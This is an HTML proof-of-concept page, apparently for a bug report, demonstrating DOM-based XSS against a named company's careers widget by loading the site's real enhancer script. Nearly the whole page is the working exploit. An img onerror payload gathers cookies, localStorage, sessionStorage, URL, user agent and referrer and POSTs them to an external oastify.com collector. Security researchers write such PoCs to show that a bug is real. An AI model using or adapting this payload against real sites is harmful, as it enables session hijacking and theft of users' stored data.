<!DOCTYPE html>
<html>
<head>
<title>ðŸ”¥ Just Eat Widget XSS PoC</title>
</head>
<body>
<h2>DOM-Based XSS in Just Eat Careers Widget</h2>

<!-- Malicious widget -->
<div class="ph-widget" as-element="exploitWidget">
<img src=x onerror="
const exfil = {
cookie: document.cookie,
localStorage: JSON.stringify(localStorage),
sessionStorage: JSON.stringify(sessionStorage),
url: location.href,
origin: location.origin,
userAgent: navigator.userAgent,
referrer: document.referrer
};
fetch('https://ykmkw5n8la7rld89saeryu121t7mvcj1.oastify.com', {
method: 'POST',
mode: 'no-cors',
body: JSON.stringify(exfil)
});
">
</div>

<!-- Load vulnerable enhancer from target -->
<script src="https://careers.justeattakeaway.com/global/en/phenomtrack.min.js"></script>
<script>
window.PhEnhancer && PhEnhancer(); // Trigger widget parsing
</script>
</body>
</html>
